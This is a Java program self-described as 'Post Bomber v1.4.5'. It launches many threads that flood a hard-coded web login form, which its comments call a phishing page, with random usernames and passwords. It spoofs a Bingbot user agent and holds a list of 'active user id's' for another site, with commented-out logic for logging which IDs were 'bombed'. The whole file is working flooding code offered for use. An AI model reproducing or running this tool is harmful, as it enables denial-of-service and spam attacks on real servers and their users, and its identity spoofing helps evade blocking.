import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Random;

/**
 * Created by IntelliJ IDEA.
 * User: Kyle
 * Date: 5/15/11
 * Time: 6:17 PM
 * To change this template use File | Settings | File Templates.
 */
class Missile extends Thread {

    public void run() {
        try {
            login(randString(100)/*username*/, random(100)/*password*/, /*rand(1, 1138) randString(25)+"@"+ randString(5)+".com"*/ /*randomID()*/ "1");
        } catch (Exception i) {
            i.printStackTrace();
        }
    }

    public static void login(String username, String password, String ssl) throws IOException {
	/*Phishing url to bomb*/
        String url = "http://sercure-rs.x10.mx/rurescape/m=weblogin/login.php", charset = "UTF-8";
		
	/* The html form <inputs>
	 * The only necessary ones are username, password, and ssl
	 */
        String query = String.format("username=%s&password=%s&ssl=%s",
                URLEncoder.encode(username, charset),
                URLEncoder.encode(password, charset),
                URLEncoder.encode(ssl, charset));
        URLConnection connection = new URL(url).openConnection();
        connection.setDoOutput(true);// Triggers POST.
        connection.setRequestProperty("Accept-Charset", charset);
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded;charset=" + charset);
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)");//Bing useragent for lulz
        OutputStream output = null;
        try {
            System.out.print(Thread.currentThread().getName() + " sending post data... ");
            try {
                output = connection.getOutputStream();
                output.write(query.getBytes(charset));
            } finally {
                if (output != null) try {
                    output.close();
                    System.out.println("done!");
                } catch (IOException e) {
                    System.out.println("failed.");
                    //e.getMessage();
                }
            }
            InputStream response = connection.getInputStream();//required to post data, gets a response from the page when we posted data.

            /*Un-comment below to get the response code of the page*/

            /*int status = ((HttpURLConnection) connection).getResponseCode();
            for (Map.Entry<String, java.util.List<String>> header : connection.getHeaderFields().entrySet()) {
                System.out.println(header.getKey() + "=" + header.getValue()); //uncomment to view header info
                System.out.println("Status: " + status);
            }*/

            /*Un-comment below to get the content type of the requested page*/

            /*String contentType = connection.getHeaderField("Content-Type");
            for (String param : contentType.replace(" ", "").split(";")) {
                if (param.startsWith("charset=")) {
                    charset = param.split("=", 2)[1];
                    break;
                }
            }*/

            /*Un-comment below to read the response of the posted data--read the page for a string such as "Success" or "invalid" etc*/
            /*if (charset != null) {
                BufferedReader reader = null;
                try {
                    reader = new BufferedReader(new InputStreamReader(response, charset));
                    for (String line; (line = reader.readLine()) != null; ) {
                        if (!line.contains("Your subscripton has is not activated")) {
                            System.out.println(Thread.currentThread().getName() + " Bombed id " + ssl);
                            FileWriter logSuccess = new FileWriter("success.log", true);
                            logSuccess.append(ssl).append("\r\n");
                            logSuccess.close();
                        } else {
                            FileWriter log = new FileWriter("debug.html", true);
                            log.append(line).append("\r\n");
                            log.close();
                            System.out.println(line);
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if (reader != null) try {
                        reader.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            } else {
                System.out.println("Error: charset is null. Is the data binary content?"); //if it is use input/output streams.
            }*/
        } catch (Exception se) {
            System.out.println(Thread.currentThread().getName() + " Network is unreachable. (We're banned or site is offline)");
            try {
                Thread.sleep(5000);
            } catch (Exception i) {
                System.out.println("Error sleeping for 5 seconds: " + i.getMessage());
            }
        }
    }

    public static String random(int len) {
        final String AB = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_-=+/*\\~`|[]{}:;'><.,?\"";
        Random rnd = new Random();
        StringBuilder sb = new StringBuilder(len);
        for (int i = 0; i < len; i++) {
            sb.append(AB.charAt(rnd.nextInt(AB.length())));
        }
        return sb.toString();
    }

    public static String randString(int len) {
        final String AB = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        Random rnd = new Random();
        StringBuilder sb = new StringBuilder(len);
        for (int i = 0; i < len; i++) {
            sb.append(AB.charAt(rnd.nextInt(AB.length())));
        }
        return sb.toString();
    }

    public static String rand(int min, int max) {
        Random rand = new Random();
        String Result = String.valueOf(rand.nextInt(max - min + 1) + min);
        /*if (Result.equals("57")) {  //so poild doesn't get bombed
            Result = String.valueOf(rand.nextInt(max - min + 1) + min);
        }*/
        return Result;
    }

    public static String randomID() { //active user id's for runescapesr.com
        Random random = new Random();
        final int ids[] = {10, 13, 14, 15, 18, 19, 22, 24, 25, 26, 48, 49, 50, 51, 55, 80, 126, 130, 131, 145, 214, 276, 295, 321, 341, 354, 364, 372, 388, 397, 431, 433, 449, 496, 503, 506, 546, 547, 560, 588, 591, 594, 613, 626, 634, 644, 649, 668, 683, 689, 740, 749, 765, 781, 810, 820, 826, 834, 841, 851, 859, 870, 878, 888, 889, 890, 893, 898, 903, 906, 909, 910, 911, 912, 950, 966, 987, 992, 998, 1000, 1010, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1024, 1025, 1026, 1027, 1031, 1042, 1044, 1051, 1055, 1061, 1062, 1095, 1098, 1100, 1104, 1106, 1110, 1111};
        return String.valueOf(ids[random.nextInt(ids.length)]);
    }
}


public class Bomb {

    public static void main(String[] args) {
        if (args.length > 0) {
            int ClientCount = Integer.parseInt(args[0]);
            int sleep = Integer.parseInt(args[1]);

            System.out.println("Post Bomber v1.4.5 by Kyle");
            pause(500);
            System.out.print("Initializing... ");
            Thread[] workers = new Thread[ClientCount];
            for (int i = 0; i < ClientCount; i++) {
                workers[i] = new Missile();
            }
            System.out.println("done!");
            for (int i = 0; i < ClientCount; i++) {
                workers[i].start();
                pause(sleep);
            }
            for (int i = 0; i < ClientCount; i++) {
                try {
                    workers[i].join();
                } catch (Exception c) {
                    System.out.print("Error terminating " + workers[i].getName() + " for the reason: " + c.getMessage());
                }
            }
            System.out.println("Bombing Complete.\n");
        } else {
            System.out.println("Example usage: java Bomb #_of_threads thread_sleep(ms))\n\njava Bomb 200 750\n\nThe above says \"Use 200 threads and sleep 750 milliseconds between each thread start\"");
            System.exit(0);
        }
    }

    public static void pause(int seconds) {
        try {
            Thread.sleep(seconds);
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
    }
}
